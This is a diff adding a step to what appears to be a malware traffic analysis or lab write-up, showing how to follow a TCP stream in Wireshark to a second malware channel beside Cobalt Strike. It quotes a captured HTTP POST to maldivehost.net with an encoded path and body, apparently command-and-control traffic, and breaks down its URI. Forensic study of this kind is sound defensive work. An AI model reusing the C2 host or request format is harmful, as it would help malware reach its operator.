@@ -568,7 +568,34 @@ Key finding: a second, independent malware channel runs alongside the Cobalt Str
 <br>
 </div>
 
+**How to find it:**
 
+```
+Right-click the first frame in the maldivehost.net conversation → Follow → TCP Stream
+Auto-applied filter:  tcp.stream eq 104
+```
+
+Read the opening bytes of the client half of the stream.
+
+**Result:**
+
+![[Pasted image 20260819154337.png]]
+
+```
+POST /zLIisQRWZI9/OQsaDixzHTgtfjMcGypGenpldWF5eWV9f3k= HTTP/1.1
+Host: maldivehost.net
+Content-Length: 112
+
+Dw8YBxsEGmYFAAEJfR4NQkMmLTYqZDk5KyQmORGQg1xEBo4Lzk/EyYrMi1hOT8vIyM7IhcNPzsOKjguFxgkLSIiJCxFRgwFAgIIDQUZGBoFD0JF
+```
+
+Character-by-character from the start of the client's transmission:
+
+```
+P  O  S  T  /  z  L  I  i  s  Q  R  W  Z  I  9
+                 └───────────────────────────┘
+                  first 11 after "POST /"
+```
 <div align="center">
 <br>
 ※※※※※※※※※※※※※※※※※※※※※※※※
